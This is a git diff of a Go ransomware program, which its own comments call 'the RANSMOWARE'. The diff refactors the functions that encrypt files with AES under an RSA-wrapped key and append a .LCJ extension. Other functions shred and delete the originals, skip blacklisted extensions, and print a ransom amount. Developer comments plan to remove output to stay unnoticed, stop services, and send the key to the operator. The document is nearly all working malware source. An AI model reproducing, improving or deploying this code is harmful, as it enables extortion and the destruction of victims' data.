@@ -1,15 +1,9 @@
-
-// Package shred is a golang library to mimic the functionality of the linux shred command
 package main
 
 // lisandro : delete all prints
 // lisandro : sc delete|stop <service> (in cmd, delete|stop the service)
 
-// lisandro : change the encryption swipe time from 3 to 2 ? (1?)
-
-// change the key var by another random string at the end of the program
-
-// send through an encrypted network the amount of file encrypted, datetime, the ID of the RANSMOWARE, and a e-mail
+// send through an encrypted network the amount of file encrypted, datetime, the ID of the RANSMOWARE, and an e-mail
 // and send with the message the encryption key
 
 import (
@@ -145,7 +139,6 @@ var LINUX_ff_blacklist = []string{
 
 var wg sync.WaitGroup
 var total_files_opened int64 // edode : MB value
-var ext int
 
 func init() {
 	operating_system = detect_os()
@@ -171,8 +164,6 @@ func Error(err error) (error){
 	}
 	return nil
 }
-
-// ========= SHRED =========
 
 func overwrite_remove(path string) (error) { // lisandro : do not encrypt file if it's above 950MB
 	f, err := os.OpenFile(path, os.O_WRONLY, 0)
@@ -207,7 +198,6 @@ func overwrite_remove(path string) (error) { // lisandro : do not encrypt file i
 	}
 	return nil
 }
-// ========= END SHRED =========
 
 // ========= ENCRYPT =========
 func ParseRsaPublicKeyFromPemStr() (*rsa.PublicKey, error) {
@@ -276,7 +266,7 @@ func create_encryption_key() []byte {
 	encrypted_new_key :=  encrypt_encryption_key(new_key)
 	err := ioutil.WriteFile("key", encrypted_new_key, 0644)
 	if err != nil {
-		fmt.Printf("Error creating Key file!")
+		//fmt.Printf("Error creating Key file!")
 		os.Exit(0)
 	}
 	return new_key
@@ -292,16 +282,15 @@ func encryption_key() {
 }
 
 func encrypt_file(inputfile string, outputfile string) {
-	if inputfile == "/root/y/_libcef.so"{
-		fmt.Println("ez")
+	if inputfile == "/root/y/libcef.so"{
+		pass()
 	}
 	b, err := ioutil.ReadFile(inputfile) //Read the target file
 	Error(err)
 	ciphertext := encrypt(key, b)
-	//fmt.Printf("%x\n", ciphertext)
 	err = ioutil.WriteFile(outputfile, ciphertext, 0644)
 	if err != nil {
-		fmt.Printf("Unable to create encrypted file!\n")
+		//fmt.Printf("Unable to create encrypted file!\n")
 		os.Exit(0)
 	}
 }
@@ -311,41 +300,35 @@ func encodeBase64(b []byte) []byte {
 }
 
 func encrypt(key, text []byte) []byte {
-	// lisandro : move the 4 lines below to be global ?
+	var above_150MB bool = false
+	var not_ciphered_text, ciphered_text, encoded_string []byte
 
-	var above bool = false // edode : if file size is above 950 MB
-	var not_ciphered_text, ciphered_text []byte
 	block, err := aes.NewCipher(key)
-	ciphered_text = text
 	if err != nil {
 		panic(err)
 	}
-	if len(text) > MB150 { // edode : if the size of the file is superior to 150MB
-		ciphered_text 	  = text[:MB150]
-		not_ciphered_text = text[MB150:]
-		above = true
+
+	if len(text) > MB150 {
+		ciphered_text 	  = text[:10485760]
+		not_ciphered_text = text[10485760:]
+		encoded_string = encodeBase64(ciphered_text)
+		above_150MB = true
+	} else {
+		encoded_string = encodeBase64(text)
 	}
 
-	b := encodeBase64(ciphered_text)
-	ciphertext := make([]byte, aes.BlockSize+len(b))
-	iv := ciphertext[:aes.BlockSize]
+	ciphertext := make([]byte, aes.BlockSize+len(encoded_string))
 
+	iv := ciphertext[:aes.BlockSize]
 	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
 		panic(err)
 	}
 
 	cfb := cipher.NewCFBEncrypter(block, iv)
-	cfb.XORKeyStream(ciphertext[aes.BlockSize:], b)
+	cfb.XORKeyStream(ciphertext[aes.BlockSize:], encoded_string)
 
-	if above {
-		scrambled_text := make([]byte, len(ciphertext)+len(not_ciphered_text))
-		for _, bit := range(ciphertext){
-			scrambled_text = append(scrambled_text, bit)
-		}
-		for _, bit := range(not_ciphered_text){
-			scrambled_text = append(scrambled_text, bit)
-		}
-		return scrambled_text;
+	if above_150MB {
+		return append(ciphertext, not_ciphered_text...);
 	}
 	return ciphertext;
 }
@@ -353,7 +336,6 @@ func encrypt(key, text []byte) []byte {
 
 func is_in_blacklist(val interface{}, array interface{}) (bool) {
 	exists := false
-	//index  := -1
 
 	switch reflect.TypeOf(array).Kind() {
 	case reflect.Slice:
@@ -489,18 +471,10 @@ func get_drives() (r []string){
 	return
 }
 
-func remove_to_index(s []string, index int) ([]string) {
-	sub := make([]string, len(s))
-	copy(sub, s)
-	sub = append(sub[index:len(s)], s[len(s):]...)
-	return sub
-}
-
 func is_dir(path string)(bool){
 	name := path
 	fi, err := os.Stat(name)
 	if err != nil {
-		fmt.Println(err)
 		return false
 	}
 	switch mode := fi.Mode(); {
@@ -525,16 +499,6 @@ func is_symlink(file string)(bool) {
 	}
 }
 
-func file_to_byte(file string)(int64){
-	fi, err := os.Stat(file)
-	Error(err)
-	return fi.Size()
-}
-
-func byte_to_mega(file int64)(float64){
-	var file_size float64 = float64((file / 1024) / 1024)
-	return file_size
-}
 
 func check_ext(file string) bool{
 	ext_split := strings.Split(file, ".")
@@ -568,31 +532,14 @@ func listdir(path string)([]string){
 	return fileList
 }
 
-func order_files(not_ordered_files[]string)([]string, []string) {
-	var under_150_mb, other []string
-
-	for _, f := range (not_ordered_files) {
-		fs, err := os.Stat(f)
-		_ = fs
-		Error(err)
-		if float64(fs.Size() / 1024 / 1024) <= 150 {
-			under_150_mb = append(under_150_mb, f)
-		} else {
-			other = append(other, f)
-		}
-	}
-	return under_150_mb, other
-}
-
 func main() { // GOOS=windows GOARCH=amd64 go build -o lcj.exe encryptor.go
 	start := time.Now()
-	//files := get_all_files()
 	files := listdir("/root/y")
-	//under_150, other := order_files(files)
+	//files := get_all_files()
 	encryption_key()
 
 	c := make(chan string, 100)
-
+	var fe int
 	for _, f := range(files){
 		if check_ext(f) || is_dir(f) || is_symlink(f){
 			continue
@@ -600,7 +547,7 @@ func main() { // GOOS=windows GOARCH=amd64 go build -o lcj.exe encryptor.go
 		if runtime.NumGoroutine() == 50{
 			wg.Wait()
 		}
-		if len(c) > cap(c) - 50 {
+		if len(c) > cap(c) - 50 { // lisandro : create func wipe chan
 			wg.Wait()
 			for {
 				if len(c) == 0{ break }
@@ -609,12 +556,10 @@ func main() { // GOOS=windows GOARCH=amd64 go build -o lcj.exe encryptor.go
 				if e!=nil { continue }
 			}
 		}
-
-		ext++
+		fe++
 		wg.Add(1)
 		go func (f string, c chan string) (){
 			defer wg.Done()
-			//fmt.Println(total_files_opened)
 			encrypt_file(f, f+".LCJ")
 			err := overwrite_remove(f)
 			if err != nil{
@@ -623,39 +568,24 @@ func main() { // GOOS=windows GOARCH=amd64 go build -o lcj.exe encryptor.go
 			c <- f
 		}(f, c)
 	}
-	wg.Wait()
 
-	//fmt.Println("light files encrypted")
-	for _, f := range(files){
-		if check_ext(f) || is_dir(f) || is_symlink(f){
-			continue
-		}
-		e := os.Remove(f)
-		if e!=nil {
-			continue
+	wg.Wait()
+	if len(c) != 0{
+		for {
+			if len(c) == 0{ break }
+			d := <- c
+			e := os.Remove(d)
+			if e!=nil { continue }
 		}
 	}
-	fmt.Println("Files encrypted : ", ext, "Ransom amount : ", ransom_amount(ext))
+
+	fmt.Println("Files encrypted : ", fe, "Ransom amount : ", ransom_amount(fe))
 	log.Printf("SECOND ELAPSED : %s", time.Since(start))
 }
 
-
-
-
-
-
-
-
-//var pa *[]string
-//pa = &file_tree
-//fmt.Println("In for : ", &pa)
-
-
-
-
-
-
-
-
-
-
+/*
+edode : getting the memory address of variables :
+  var pa *[]string
+  pa = &file_tree
+  fmt.Println("In for : ", &pa)
+*/
